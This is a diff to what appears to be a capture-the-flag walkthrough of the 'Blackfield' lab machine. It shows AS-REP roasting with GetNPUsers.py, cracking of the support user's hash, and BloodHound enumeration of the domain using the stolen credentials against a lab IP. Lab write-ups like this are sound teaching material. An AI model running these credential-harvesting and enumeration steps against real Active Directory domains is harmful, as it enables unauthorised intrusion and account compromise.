@@ -39,7 +39,7 @@
 
 `GetNPUsers.py -request -usersfile users.list -outputfile asreproastables.txt -dc-ip 10.129.229.17 -format hashcat 'blackfield.local/'`
 
-
+<img width="910" height="108" alt="image" src="https://github.com/user-attachments/assets/097681fb-ab6e-4777-8df8-5e7f5a8b9030" />
 
 4. Success! Now crack the hash and we get user support's credentials. 
 
@@ -48,3 +48,7 @@
 5. Now that we have a valid credentials on the domain, we run Bloodhound to enumerate the network
 
 `sudo bloodhound-python -d blackfield.local -u support -p $(cat recon/support.pass) -ns 10.129.229.17 -c all` 
+
+6. Load files onto Bloodhound and find a path from support user to machine
+
+
